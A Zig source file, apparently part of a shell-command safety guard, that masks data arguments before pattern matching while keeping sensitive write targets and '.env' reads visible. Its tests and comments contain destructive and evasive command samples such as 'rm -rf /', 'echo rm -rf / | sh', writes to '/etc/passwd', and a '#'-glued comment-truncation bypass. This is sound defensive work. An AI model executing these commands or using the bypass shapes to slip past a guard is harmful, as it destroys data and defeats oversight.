//! Lightweight false-positive immunity: mask known-safe string arguments
//! (rg patterns, git commit messages, echo data) so destructive substrings
//! inside data do not trigger pack matches.
const std = @import("std");
const segments = @import("segments.zig");

/// Return a heap-owned command with safe data arguments replaced by spaces.
pub fn sanitizeForMatching(allocator: std.mem.Allocator, command: []const u8) ![]u8 {
    // Keep this list in lockstep with isDataOnlyCommand / isSearchCommand words that
    // need masking or restore. less/more/bat must be present so pure `less …`
    // commands enter the data-only arm (FP immunity + exact `.env` restore).
    const needs = containsAnyWord(command, &[_][]const u8{
        "rg",  "grep",   "egrep", "fgrep", "ag",   "ack",  "echo", "printf",
        "git", "sed",    "awk",   "cat",   "head", "tail", "wc",   "sort",
        "tee", "sponge", "less",  "more",  "bat",
    }) or std.mem.indexOfScalar(u8, command, '#') != null;
    if (!needs) return try allocator.dupe(u8, command);

    const out = try allocator.dupe(u8, command);
    errdefer allocator.free(out);

    maskComments(out);

    // Data-only commands: mask all quoted spans and, for echo/printf, mask
    // unquoted argv after the command word — but NOT when the data is piped
    // into an interpreter (`echo rm -rf / | sh`), where the payload executes.
    // Redirect operators + targets (including quoted / $'...' / $(...) / >(...))
    // and pipe-to-writer sinks (`| tee path`) must stay visible for pack matching;
    // maskAllQuoted blanks quoted targets first, so restore those spans from the
    // original after masking.
    if (isDataOnlyCommand(out) and !pipesIntoInterpreter(out)) {
        maskAllQuoted(out);
        maskArgsAfterCommand(out);
        restoreWriteSinks(out, command);
        // Bare `tee /etc/passwd` has no `>` / pipe — restore path-shaped argv so
        // packs still match sensitive write destinations after data masking.
        restorePathShapedArgs(out, command);
        // Process-sub / pipe-to-tee keep paths after restore, but pack regexes
        // require `> /sensitive` shape — rewrite those sinks for pack match only.
        rewriteWriteSinksForPackMatch(out);
        return out;
    }

    // Search tools: first non-flag arg is often the pattern. Still restore write
    // redirects so `rg x > "/etc/passwd"` remains pack-visible after quote mask.
    if (isSearchCommand(out)) {
        maskAllQuoted(out);
        restoreWriteSinks(out, command);
        rewriteWriteSinksForPackMatch(out);
        return out;
    }

    // git commit -m / --message: mask message strings, keep write redirects.
    if (containsWord(out, "git") and (std.mem.indexOf(u8, out, "commit") != null)) {
        maskAllQuoted(out);
        restoreWriteSinks(out, command);
        rewriteWriteSinksForPackMatch(out);
        return out;
    }

    // Non-data-only producers (`curl|tee`, `yes|tee`, `sed|dd of=`) never enter
    // the data-only arm; still rewrite pipe-to-writer sinks so packs that need a
    // `> /path` shape (or benefit from path extraction) can match.
    if (hasUnquotedPipeToWriter(out)) {
        rewriteWriteSinksForPackMatch(out);
    }

    // Long padding lines used in regex_worst_case corpus: if command is mostly
    // filler around a destructive phrase as data, leave as-is only for real exec.
    // Echo-with-padding is already handled by isDataOnlyCommand.

    return out;
}

/// True when `buf` has an unquoted `|` whose RHS simple-command is a known writer.
fn hasUnquotedPipeToWriter(buf: []const u8) bool {
    var i: usize = 0;
    var in_single = false;
    var in_double = false;
    while (i < buf.len) : (i += 1) {
        const c = buf[i];
        if (c == '\\' and !in_single and i + 1 < buf.len) {
            i += 1;
            continue;
        }
        if (c == '\'' and !in_double) {
            in_single = !in_single;
            continue;
        }
        if (c == '"' and !in_single) {
            in_double = !in_double;
            continue;
        }
        if (in_single or in_double) continue;
        if (c == '|' and !(i + 1 < buf.len and buf[i + 1] == '|')) {
            if (pipeRhsIsWriter(buf, i + 1)) return true;
        }
    }
    return false;
}

fn isDataOnlyCommand(cmd: []const u8) bool {
    const t = std.mem.trim(u8, cmd, " \t");
    // first word
    var i: usize = 0;
    while (i < t.len and !std.ascii.isWhitespace(t[i])) : (i += 1) {}
    const word = basename(t[0..i]);
    const data = [_][]const u8{
        "echo", "printf", "cat",    "tee",    "head",      "tail",
        "wc",   "sort",   "base64", "md5sum", "sha256sum", "less",
        "more", "bat",
    };
    for (data) |d| {
        if (std.mem.eql(u8, word, d)) return true;
    }
    return false;
}

fn isInterpreterBasename(base: []const u8) bool {
    const names = [_][]const u8{
        "sh",     "bash",    "zsh",  "ksh",  "dash", "fish",
        "python", "python3", "ruby", "perl", "node",
    };
    for (names) |n| {
        if (std.mem.eql(u8, base, n)) return true;
    }
    return false;
}

/// True when an unquoted `|` feeds a shell/interpreter (payload becomes executable).
fn pipesIntoInterpreter(cmd: []const u8) bool {
    var i: usize = 0;
    var in_single = false;
    var in_double = false;
    while (i < cmd.len) : (i += 1) {
        const c = cmd[i];
        if (c == '\\' and !in_single and i + 1 < cmd.len) {
            i += 1;
            continue;
        }
        if (c == '\'' and !in_double) {
            in_single = !in_single;
            continue;
        }
        if (c == '"' and !in_single) {
            in_double = !in_double;
            continue;
        }
        if (in_single or in_double) continue;
        if (c != '|') continue;
        // Skip `||`
        if (i + 1 < cmd.len and cmd[i + 1] == '|') {
            i += 1;
            continue;
        }
        var j = i + 1;
        while (j < cmd.len and std.ascii.isWhitespace(cmd[j])) : (j += 1) {}
        // Optional env/command wrappers before the interpreter word.
        while (j < cmd.len) {
            var end = j;
            while (end < cmd.len and !std.ascii.isWhitespace(cmd[end]) and cmd[end] != '|' and
                cmd[end] != ';' and cmd[end] != '&' and cmd[end] != '<' and cmd[end] != '>') : (end += 1)
            {}
            if (end == j) break;
            const word = cmd[j..end];
            const base = basename(word);
            if (isInterpreterBasename(base)) return true;
            // Skip common wrappers and keep scanning the pipe RHS first word chain.
            if (std.mem.eql(u8, base, "env") or std.mem.eql(u8, base, "command") or
                std.mem.eql(u8, base, "exec") or std.mem.eql(u8, base, "nice") or
                std.mem.eql(u8, base, "nohup") or std.mem.eql(u8, base, "sudo"))
            {
                j = end;
                while (j < cmd.len and std.ascii.isWhitespace(cmd[j])) : (j += 1) {}
                // Skip ENV=val for env
                while (j < cmd.len) {
                    var k = j;
                    while (k < cmd.len and !std.ascii.isWhitespace(cmd[k])) : (k += 1) {}
                    const tok = cmd[j..k];
                    if (std.mem.indexOfScalar(u8, tok, '=') != null) {
                        j = k;
                        while (j < cmd.len and std.ascii.isWhitespace(cmd[j])) : (j += 1) {}
                        continue;
                    }
                    break;
                }
                continue;
            }
            break;
        }
    }
    return false;
}

fn isSearchCommand(cmd: []const u8) bool {
    const t = std.mem.trim(u8, cmd, " \t");
    var i: usize = 0;
    while (i < t.len and !std.ascii.isWhitespace(t[i])) : (i += 1) {}
    const word = basename(t[0..i]);
    const search = [_][]const u8{ "rg", "grep", "egrep", "fgrep", "ag", "ack" };
    for (search) |d| {
        if (std.mem.eql(u8, word, d)) return true;
    }
    return false;
}

fn maskComments(buf: []u8) void {
    var i: usize = 0;
    var in_single = false;
    var in_double = false;
    while (i < buf.len) : (i += 1) {
        const c = buf[i];
        if (c == '\\' and !in_single and i + 1 < buf.len) {
            i += 1;
            continue;
        }
        if (c == '\'' and !in_double) {
            in_single = !in_single;
            continue;
        }
        if (c == '"' and !in_single) {
            in_double = !in_double;
            continue;
        }
        // POSIX: `#` opens a comment only at the start of a word. A glued `#`
        // (`safe#; rm -rf /`) is literal text — masking it would hide the
        // payload from pack matching. Must agree with segments.isCommentStart.
        if (!in_single and !in_double and c == '#' and segments.isCommentStart(buf, i)) {
            while (i < buf.len and buf[i] != '\n') : (i += 1) {
                buf[i] = ' ';
            }
            if (i < buf.len) i -= 1;
        }
    }
}

fn maskAllQuoted(buf: []u8) void {
    var i: usize = 0;
    while (i < buf.len) {
        const c = buf[i];
        if (c == '"' or c == '\'') {
            const q = c;
            i += 1;
            while (i < buf.len and buf[i] != q) : (i += 1) {
                if (buf[i] == '\\' and q == '"' and i + 1 < buf.len) {
                    buf[i] = 'x';
                    i += 1;
                    buf[i] = 'x';
                    continue;
                }
                if (!std.ascii.isWhitespace(buf[i])) buf[i] = 'x';
            }
            if (i < buf.len) i += 1;
            continue;
        }
        // ANSI C $'...'
        if (c == '$' and i + 1 < buf.len and buf[i + 1] == '\'') {
            i += 2;
            while (i < buf.len and buf[i] != '\'') : (i += 1) {
                if (!std.ascii.isWhitespace(buf[i])) buf[i] = 'x';
            }
            if (i < buf.len) i += 1;
            continue;
        }
        i += 1;
    }
}

fn maskArgsAfterCommand(buf: []u8) void {
    // Skip first word, then mask data args — but preserve write-redirect operators
    // and their targets (quoted / process-sub / substitution) and pipe-to-writer
    // sinks (`| tee path`) so packs still see sensitive write destinations while
    // `echo rm -rf /` (data only) stays masked.
    var i: usize = 0;
    while (i < buf.len and std.ascii.isWhitespace(buf[i])) : (i += 1) {}
    while (i < buf.len and !std.ascii.isWhitespace(buf[i])) : (i += 1) {}
    while (i < buf.len) {
        if (std.ascii.isWhitespace(buf[i])) {
            i += 1;
            continue;
        }
        if (writeRedirectOperatorEnd(buf, i)) |op_end| {
            // Leave write-redirect operator bytes intact; advance past them.
            // Input redirects (`<`, `<<`, `<<<`) are NOT preserved — their
            // "targets" are data sources (files/herestrings) that must stay masked.
            i = op_end;
            while (i < buf.len and std.ascii.isWhitespace(buf[i])) : (i += 1) {}
            // Preserve the full redirect target (quoted, $'...', $(...), >(...), bare).
            i = redirectTargetEnd(buf, i);
            continue;
        }
        // Pipe to known writer (`| tee /etc/passwd`, `| sudo dd of=...`): preserve
        // the pipe and the RHS simple command so sensitive paths stay visible.
        if (buf[i] == '|' and !(i + 1 < buf.len and buf[i + 1] == '|')) {
            if (pipeRhsIsWriter(buf, i + 1)) {
                i = unquotedSimpleCommandEnd(buf, i);
                continue;
            }
        }
        // Mask one data character (quotes already handled by maskAllQuoted).
        if (buf[i] != '"' and buf[i] != '\'') {
            buf[i] = 'x';
        }
        i += 1;
    }
}

/// Re-copy original bytes for write redirects + process-sub targets and for
/// pipe-to-writer sinks so pack matching still sees sensitive paths that
/// `maskAllQuoted` blanked. Length is unchanged by masking, so indices align.
fn restoreWriteSinks(buf: []u8, original: []const u8) void {
    if (buf.len != original.len) return;
    var i: usize = 0;
    while (i < buf.len and std.ascii.isWhitespace(buf[i])) : (i += 1) {}
    while (i < buf.len and !std.ascii.isWhitespace(buf[i])) : (i += 1) {}
    while (i < buf.len) {
        if (std.ascii.isWhitespace(buf[i])) {
            i += 1;
            continue;
        }
        if (writeRedirectOperatorEnd(buf, i)) |op_end| {
            var t = op_end;
            while (t < buf.len and std.ascii.isWhitespace(buf[t])) : (t += 1) {}
            const target_end = redirectTargetEnd(buf, t);
            if (target_end > i) {
                @memcpy(buf[i..target_end], original[i..target_end]);
            }
            i = target_end;
            continue;
        }
        if (buf[i] == '|' and !(i + 1 < buf.len and buf[i + 1] == '|')) {
            if (pipeRhsIsWriter(buf, i + 1)) {
                const end = unquotedSimpleCommandEnd(buf, i);
                if (end > i) {
                    @memcpy(buf[i..end], original[i..end]);
                }
                i = end;
                continue;
            }
        }
        i += 1;
    }
}

/// After data-only masking, re-copy argv tokens pack matchers must still see:
/// absolute/home write sinks (`tee /etc/passwd`) and exact `.env` basenames
/// (`cat .env` / `less path/.env`) for `core.credentials:cat-env`.
/// Skips redirect targets (handled elsewhere) and herestring/heredoc bodies.
fn restorePathShapedArgs(buf: []u8, original: []const u8) void {
    if (buf.len != original.len) return;
    var i: usize = 0;
    while (i < buf.len and std.ascii.isWhitespace(buf[i])) : (i += 1) {}
    while (i < buf.len and !std.ascii.isWhitespace(buf[i])) : (i += 1) {}
    while (i < buf.len) {
        if (std.ascii.isWhitespace(buf[i])) {
            i += 1;
            continue;
        }
        // Any redirect op (write or input): skip operator + target without
        // path-argv restore. Write targets are already restored; input targets
        // (including `<<<` herestrings) must stay masked.
        if (redirectOperatorEnd(buf, i)) |op_end| {
            var t = op_end;
            while (t < buf.len and std.ascii.isWhitespace(buf[t])) : (t += 1) {}
            i = redirectTargetEnd(buf, t);
            continue;
        }
        // Pipe stages: leave to restoreWriteSinks / rewriteWriteSinksForPackMatch.
        if (buf[i] == '|' and !(i + 1 < buf.len and buf[i + 1] == '|')) {
            i = unquotedSimpleCommandEnd(buf, i);
            continue;
        }
        const tok_end = redirectTargetEnd(buf, i);
        if (tok_end > i) {
            const tok = original[i..tok_end];
            if (isPackVisibleArgvToken(tok)) {
                @memcpy(buf[i..tok_end], tok);
            }
        }
        i = tok_end;
    }
}

/// True when a masked argv token must be restored for pack match.
fn isPackVisibleArgvToken(tok: []const u8) bool {
    return isPathShapedArg(tok) or isExactEnvBasename(tok);
}

/// Absolute or home-relative path for write-sink pack matchers.
fn isPathShapedArg(tok: []const u8) bool {
    const inner = unwrapShellQuotes(tok);
    if (inner.len == 0) return false;
    if (inner[0] == '/') return true;
    if (inner[0] == '~') return true;
    if (inner.len >= 5 and std.mem.startsWith(u8, inner, "$HOME")) return true;
    return false;
}

/// Exact basename `.env` (optional `./` or any directory prefix ending `/.env`).
/// Templates (`.env.example` / `.sample` / `.template`) and near-misses
/// (`.envrc`, `foo.env`, `.env.bak`) stay masked so packs do not see them.
fn isExactEnvBasename(tok: []const u8) bool {
    const inner = unwrapShellQuotes(tok);
    if (inner.len == 0) return false;
    if (std.mem.eql(u8, inner, ".env")) return true;
    if (std.mem.eql(u8, inner, "./.env")) return true;
    if (std.mem.endsWith(u8, inner, "/.env")) return true;
    return false;
}

/// Strip one layer of `"..."`, `'...'`, or `$'...'` if present; otherwise return `tok`.
fn unwrapShellQuotes(tok: []const u8) []const u8 {
    if (tok.len >= 2 and (tok[0] == '"' or tok[0] == '\'')) {
        const q = tok[0];
        if (tok[tok.len - 1] == q) return tok[1 .. tok.len - 1];
    }
    if (tok.len >= 3 and tok[0] == '$' and tok[1] == '\'') {
        if (tok[tok.len - 1] == '\'') return tok[2 .. tok.len - 1];
    }
    return tok;
}

/// Rewrite process-substitution write sinks and pipe-to-writer stages into a
/// pack-visible `> /path` form (length-preserving, matching buffer only).
/// Packs like `redirect-truncate-root-home` require the path immediately after
/// a write redirect; raw `> >(tee /etc/passwd)` and `| tee /etc/passwd` do not match.
fn rewriteWriteSinksForPackMatch(buf: []u8) void {
    var i: usize = 0;
    while (i < buf.len and std.ascii.isWhitespace(buf[i])) : (i += 1) {}
    while (i < buf.len and !std.ascii.isWhitespace(buf[i])) : (i += 1) {}
    while (i < buf.len) {
        if (std.ascii.isWhitespace(buf[i])) {
            i += 1;
            continue;
        }
        if (writeRedirectOperatorEnd(buf, i)) |op_end| {
            var t = op_end;
            while (t < buf.len and std.ascii.isWhitespace(buf[t])) : (t += 1) {}
            const target_end = redirectTargetEnd(buf, t);
            if (t < target_end and t < buf.len) {
                // Process-sub write sink: `> >(tee /etc/passwd)` → `> /etc/passwd…`
                // Quoted target: `> "/etc/passwd"` → `> /etc/passwd` (pack keywords
                // are `>/` / `> /`; normalize only dequotes glued forms, so spaced
                // quoted targets would otherwise keyword-miss forever).
                const is_proc_sub = (buf[t] == '>' or buf[t] == '<') and t + 1 < buf.len and buf[t + 1] == '(';
                const is_quoted = buf[t] == '"' or buf[t] == '\'' or
                    (buf[t] == '$' and t + 1 < buf.len and buf[t + 1] == '\'');
                if (is_proc_sub or is_quoted) {
                    if (firstAbsolutePath(buf[t..target_end])) |path| {
                        var path_buf: [512]u8 = undefined;
                        if (path.len <= path_buf.len and path.len <= target_end - t) {
                            @memcpy(path_buf[0..path.len], path);
                            @memset(buf[t..target_end], ' ');
                            @memcpy(buf[t .. t + path.len], path_buf[0..path.len]);
                        }
                    }
                }
            }
            i = target_end;
            continue;
        }
        if (buf[i] == '|' and !(i + 1 < buf.len and buf[i + 1] == '|')) {
            if (pipeRhsIsWriter(buf, i + 1)) {
                const end = unquotedSimpleCommandEnd(buf, i);
                // `| tee /etc/passwd` / `| dd of=/etc/passwd` → `> /etc/passwd…`
                // Skip the writer argv0 (may be `/usr/bin/tee`) so we expose the sink path.
                const path_opt = firstWriterSinkPath(buf[i..end]);
                if (path_opt) |path| {
                    var path_buf: [512]u8 = undefined;
                    if (path.len <= path_buf.len) {
                        @memcpy(path_buf[0..path.len], path);
                        @memset(buf[i..end], ' ');
                        // Need room for `>` + path (pack accepts `>/path` or `> /path`).
                        if (1 + path.len <= end - i) {
                            buf[i] = '>';
                            @memcpy(buf[i + 1 .. i + 1 + path.len], path_buf[0..path.len]);
                        } else if (path.len <= end - i) {
                            @memcpy(buf[i .. i + path.len], path_buf[0..path.len]);
                        }
                    }
                }
                i = end;
                continue;
            }
        }
        i += 1;
    }
}

/// First pack-visible path token (`/…`, `~…`, `$HOME…`) in `span`.
fn firstAbsolutePath(span: []const u8) ?[]const u8 {
    var j: usize = 0;
    while (j < span.len) : (j += 1) {
        if (!isPathShapedArgAt(span, j)) continue;
        var k = j + 1;
        while (k < span.len) {
            const c = span[k];
            if (std.ascii.isWhitespace(c) or c == ')' or c == '(' or c == ';' or
                c == '|' or c == '&' or c == '<' or c == '>' or c == '"' or c == '\'')
                break;
            k += 1;
        }
        if (k > j) return span[j..k];
    }
    return null;
}

/// `dd of=/path` or `of="/path"` / `of=$HOME/...` form inside a pipe-to-dd stage.
fn firstDdOfPath(span: []const u8) ?[]const u8 {
    const idx = std.mem.indexOf(u8, span, "of=") orelse return null;
    var j = idx + 3;
    if (j < span.len and (span[j] == '"' or span[j] == '\'')) j += 1;
    if (j >= span.len or !isPathShapedArgAt(span, j)) return null;
    var k = j + 1;
    while (k < span.len) {
        const c = span[k];
        if (std.ascii.isWhitespace(c) or c == '"' or c == '\'' or c == ')' or
            c == ';' or c == '|' or c == '&')
            break;
        k += 1;
    }
    if (k > j) return span[j..k];
    return null;
}

/// Path written by a pipe-to-writer stage (`| tee PATH`, `| dd of=PATH`), skipping
/// wrapper words and the writer argv0 (including absolute `/usr/bin/tee`).
fn firstWriterSinkPath(span: []const u8) ?[]const u8 {
    if (firstDdOfPath(span)) |p| return p;

    var j: usize = 0;
    // Optional leading `|`
    if (j < span.len and span[j] == '|') j += 1;
    while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}

    // Skip wrappers/flags then the writer command word.
    var saw_writer = false;
    while (j < span.len) {
        var end = j;
        while (end < span.len and !std.ascii.isWhitespace(span[end]) and span[end] != '|' and
            span[end] != ';' and span[end] != '&') : (end += 1)
        {}
        if (end == j) break;
        const word = span[j..end];
        const base = basename(word);
        if (!saw_writer) {
            if (isWrapperBasename(base)) {
                j = end;
                while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
                // Skip ENV=val after env, and flags after stdbuf/timeout/etc.
                while (j < span.len) {
                    var k = j;
                    while (k < span.len and !std.ascii.isWhitespace(span[k])) : (k += 1) {}
                    const tok = span[j..k];
                    if (tok.len > 0 and (tok[0] == '-' or std.mem.indexOfScalar(u8, tok, '=') != null)) {
                        j = k;
                        while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
                        continue;
                    }
                    break;
                }
                continue;
            }
            // Flags before writer (unusual but harmless): skip `-…`
            if (word.len > 0 and word[0] == '-') {
                j = end;
                while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
                continue;
            }
            if (isWriterBasename(base)) {
                saw_writer = true;
                j = end;
                while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
                continue;
            }
            return null;
        }
        break;
    }
    if (!saw_writer) return null;

    // Remaining args: skip flags (`-a`, `--append`) then take first path-shaped sink.
    while (j < span.len) {
        while (j < span.len and std.ascii.isWhitespace(span[j])) : (j += 1) {}
        if (j >= span.len) break;
        if (span[j] == '-') {
            // Flag or `--`; skip this token.
            while (j < span.len and !std.ascii.isWhitespace(span[j])) : (j += 1) {}
            continue;
        }
        // Optional quotes around path.
        if (span[j] == '"' or span[j] == '\'') {
            const q = span[j];
            j += 1;
            const start = j;
            while (j < span.len and span[j] != q) : (j += 1) {}
            if (start < j and isPathShapedArg(span[start..j])) return span[start..j];
            if (j < span.len) j += 1;
            continue;
        }
        if (isPathShapedArgAt(span, j)) {
            const start = j;
            while (j < span.len and !std.ascii.isWhitespace(span[j]) and span[j] != '|' and
                span[j] != ';' and span[j] != '&') : (j += 1)
            {}
            return span[start..j];
        }
        // Non-path arg; skip.
        while (j < span.len and !std.ascii.isWhitespace(span[j])) : (j += 1) {}
    }
    return null;
}

/// True when `span[i..]` begins a path-shaped sink (`/…`, `~`, `$HOME`).
fn isPathShapedArgAt(span: []const u8, i: usize) bool {
    if (i >= span.len) return false;
    if (span[i] == '/' or span[i] == '~') return true;
    if (span[i] == '$' and i + 5 <= span.len and std.mem.startsWith(u8, span[i..], "$HOME")) return true;
    if (span[i] == '$' and i + 6 <= span.len and std.mem.startsWith(u8, span[i..], "${HOME")) return true;
    return false;
}

/// Write-side redirect only (`>`, `>>`, `>&`, `&>`, `>|`, optional fd). Excludes
/// `<` / `<<` / `<<<` so herestring data is not treated as a redirect target.
fn writeRedirectOperatorEnd(buf: []const u8, i: usize) ?usize {
    const end = redirectOperatorEnd(buf, i) orelse return null;
    // Operator span must contain `>` (write). Pure input redirects only have `<`.
    var k = i;
    while (k < end) : (k += 1) {
        if (buf[k] == '>') return end;
    }
    return null;
}

/// Exclusive end index of a redirect target starting at `i` (quotes, ANSI-C,
/// process substitution, balanced $(...)/${...}/`...`, or a bare word).
fn redirectTargetEnd(buf: []const u8, i: usize) usize {
    if (i >= buf.len) return i;

    // "..." or '...'
    if (buf[i] == '"' or buf[i] == '\'') {
        const q = buf[i];
        var j = i + 1;
        while (j < buf.len and buf[j] != q) {
            if (buf[j] == '\\' and q == '"' and j + 1 < buf.len) {
                j += 2;
                continue;
            }
            j += 1;
        }
        if (j < buf.len) j += 1;
        return j;
    }

    // ANSI-C $'...'
    if (buf[i] == '$' and i + 1 < buf.len and buf[i + 1] == '\'') {
        var j = i + 2;
        while (j < buf.len and buf[j] != '\'') : (j += 1) {}
        if (j < buf.len) j += 1;
        return j;
    }

    // Process substitution >(cmd) or <(cmd) — full balanced group so
    // `> >(tee /etc/passwd)` keeps the sensitive path inside the sink.
    if ((buf[i] == '>' or buf[i] == '<') and i + 1 < buf.len and buf[i + 1] == '(') {
        if (balancedGroupEnd(buf, i + 1, '(', ')')) |end| return end;
    }

    // Command substitution $(...)
    if (buf[i] == '$' and i + 1 < buf.len and buf[i + 1] == '(') {
        if (balancedGroupEnd(buf, i + 1, '(', ')')) |end| return end;
    }

    // Parameter expansion ${...} (may be glued to more path chars).
    if (buf[i] == '$' and i + 1 < buf.len and buf[i + 1] == '{') {
        if (balancedGroupEnd(buf, i + 1, '{', '}')) |end| {
            var j = end;
            while (j < buf.len and !std.ascii.isWhitespace(buf[j])) {
                if (redirectOperatorEnd(buf, j) != null) break;
                j += 1;
            }
            return j;
        }
    }

    // Backtick substitution `...`
    if (buf[i] == '`') {
        var j = i + 1;
        while (j < buf.len and buf[j] != '`') {
            if (buf[j] == '\\' and j + 1 < buf.len) {
                j += 2;
                continue;
            }
            j += 1;
        }
        if (j < buf.len) j += 1;
        return j;
    }

    // Bare word (path / fd / token).
    var j = i;
    while (j < buf.len and !std.ascii.isWhitespace(buf[j])) {
        if (redirectOperatorEnd(buf, j) != null) break;
        j += 1;
    }
    return j;
}

/// `open_at` points at the opening delimiter (`(` or `{`). Returns exclusive end
/// after the matching closer, or null if unbalanced.
fn balancedGroupEnd(buf: []const u8, open_at: usize, open_ch: u8, close_ch: u8) ?usize {
    if (open_at >= buf.len or buf[open_at] != open_ch) return null;
    var depth: usize = 1;
    var j = open_at + 1;
    var in_single = false;
    var in_double = false;
    while (j < buf.len and depth > 0) : (j += 1) {
        const c = buf[j];
        if (c == '\\' and !in_single and j + 1 < buf.len) {
            j += 1;
            continue;
        }
        if (c == '\'' and !in_double) {
            in_single = !in_single;
            continue;
        }
        if (c == '"' and !in_single) {
            in_double = !in_double;
            continue;
        }
        if (in_single or in_double) continue;
        if (c == open_ch) {
            depth += 1;
        } else if (c == close_ch) {
            depth -= 1;
        }
    }
    if (depth != 0) return null;
    return j;
}

/// True when an unquoted pipe RHS simple-command contains a known write sink
/// (tee/dd/sponge), including after wrappers (`sudo`, `busybox`, `stdbuf`, …)
/// and flags (`-oL`). Scans all argv words in the stage so `busybox tee` works.
fn pipeRhsIsWriter(buf: []const u8, after_pipe: usize) bool {
    var j = after_pipe;
    while (j < buf.len and std.ascii.isWhitespace(buf[j])) : (j += 1) {}
    while (j < buf.len) {
        if (buf[j] == '|' or buf[j] == ';' or buf[j] == '&' or buf[j] == '<' or buf[j] == '>') {
            // End of this simple-command stage (except we started after `|`).
            break;
        }
        var end = j;
        while (end < buf.len and !std.ascii.isWhitespace(buf[end]) and buf[end] != '|' and
            buf[end] != ';' and buf[end] != '&' and buf[end] != '<' and buf[end] != '>') : (end += 1)
        {}
        if (end == j) return false;
        const word = buf[j..end];
        const base = basename(word);
        if (isWriterBasename(base)) return true;
        // `dd of=/path` may appear as a single token.
        if (std.mem.startsWith(u8, word, "of=") or std.mem.startsWith(u8, base, "of=")) return true;
        j = end;
        while (j < buf.len and std.ascii.isWhitespace(buf[j])) : (j += 1) {}
    }
    return false;
}

fn isWrapperBasename(base: []const u8) bool {
    return std.mem.eql(u8, base, "env") or std.mem.eql(u8, base, "command") or
        std.mem.eql(u8, base, "exec") or std.mem.eql(u8, base, "nice") or
        std.mem.eql(u8, base, "nohup") or std.mem.eql(u8, base, "sudo") or
        std.mem.eql(u8, base, "doas") or std.mem.eql(u8, base, "busybox") or
        std.mem.eql(u8, base, "stdbuf") or std.mem.eql(u8, base, "timeout") or
        std.mem.eql(u8, base, "ionice") or std.mem.eql(u8, base, "time");
}

fn isWriterBasename(base: []const u8) bool {
    return std.mem.eql(u8, base, "tee") or std.mem.eql(u8, base, "dd") or
        std.mem.eql(u8, base, "sponge");
}

/// Exclusive end of the simple-command region starting at `start` (often `|`),
/// stopping at the next unquoted command separator (`|`, `;`, `&`) or end.
fn unquotedSimpleCommandEnd(buf: []const u8, start: usize) usize {
    var i = start;
    var in_single = false;
    var in_double = false;
    // If starting on a pipe, consume it so the first-char separator check doesn't
    // immediately stop; then walk the RHS.
    if (i < buf.len and buf[i] == '|' and !(i + 1 < buf.len and buf[i + 1] == '|')) {
        i += 1;
    }
    while (i < buf.len) : (i += 1) {
        const c = buf[i];
        if (c == '\\' and !in_single and i + 1 < buf.len) {
            i += 1;
            continue;
        }
        if (c == '\'' and !in_double) {
            in_single = !in_single;
            continue;
        }
        if (c == '"' and !in_single) {
            in_double = !in_double;
            continue;
        }
        if (in_single or in_double) continue;
        if (c == '|' or c == ';' or c == '&') {
            // Stop before the next pipeline/list separator (do not consume it).
            return i;
        }
        if (c == '\n') return i;
    }
    return i;
}

/// If `buf[i..]` starts a shell redirect operator (optional fd digits + `>`/`<`/`&>`/…),
/// return the exclusive end index of the operator; otherwise null.
fn redirectOperatorEnd(buf: []const u8, i: usize) ?usize {
    if (i >= buf.len) return null;
    var j = i;
    // Optional leading fd digits (`2>`, `1>>`, …).
    while (j < buf.len and std.ascii.isDigit(buf[j])) : (j += 1) {}
    if (j < buf.len and buf[j] == '&' and j + 1 < buf.len and buf[j + 1] == '>') {
        return j + 2; // &>
    }
    if (j >= buf.len or (buf[j] != '>' and buf[j] != '<')) {
        // Digits alone are not a redirect.
        return null;
    }
    const op = buf[j];
    j += 1;
    if (j < buf.len and buf[j] == op) j += 1; // >> or <<
    if (j < buf.len and op == '<' and buf[j] == '<') j += 1; // <<<
    if (j < buf.len and buf[j] == '&') {
        j += 1; // >& or <&
        while (j < buf.len and std.ascii.isDigit(buf[j])) : (j += 1) {} // >&1
    }
    if (j < buf.len and op == '>' and buf[j] == '|') j += 1; // >|
    // Early returns above already reject pure digits / no operator.
    return j;
}

fn basename(path: []const u8) []const u8 {
    if (std.mem.lastIndexOfScalar(u8, path, '/')) |idx| {
        if (idx + 1 < path.len) return path[idx + 1 ..];
    }
    return path;
}

fn containsAnyWord(hay: []const u8, words: []const []const u8) bool {
    for (words) |w| {
        if (containsWord(hay, w)) return true;
    }
    return false;
}

fn containsWord(hay: []const u8, word: []const u8) bool {
    if (hay.len < word.len) return false;
    var i: usize = 0;
    while (i + word.len <= hay.len) : (i += 1) {
        if (std.mem.eql(u8, hay[i .. i + word.len], word)) {
            const before_ok = i == 0 or !isWordChar(hay[i - 1]);
            const after_ok = i + word.len == hay.len or !isWordChar(hay[i + word.len]);
            if (before_ok and after_ok) return true;
        }
    }
    return false;
}

fn isWordChar(c: u8) bool {
    return std.ascii.isAlphanumeric(c) or c == '_' or c == '-' or c == '.';
}

test "sanitize masks rg pattern" {
    const s = try sanitizeForMatching(std.testing.allocator, "rg -n \"rm -rf\" README.md");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
}

test "sanitize masks echo data" {
    const s = try sanitizeForMatching(std.testing.allocator, "echo 'rm -rf /'");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
}

test "sanitize masks echo unquoted destructive text" {
    const s = try sanitizeForMatching(std.testing.allocator, "echo rm -rf /");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
}

test "sanitize masks shell comment body" {
    const s = try sanitizeForMatching(std.testing.allocator, "ls -la # rm -rf /");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
}

test "sanitize does not mask glued hash as a comment" {
    // `safe#` is one word — the `#` is literal text, so `; rm -rf /` must
    // stay visible for pack matching (comment-truncation bypass). Use a
    // non-data-only first word so only maskComments decides visibility.
    const s = try sanitizeForMatching(std.testing.allocator, "curl safe#; rm -rf /");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") != null);
}

test "sanitize keeps word-start comment masking after fix" {
    const s = try sanitizeForMatching(std.testing.allocator, "echo ok # explanation; rm -rf /");
    defer std.testing.allocator.free(s);
    try std.testing.expect(std.mem.indexOf(u8, s, "rm -rf") == null);
}

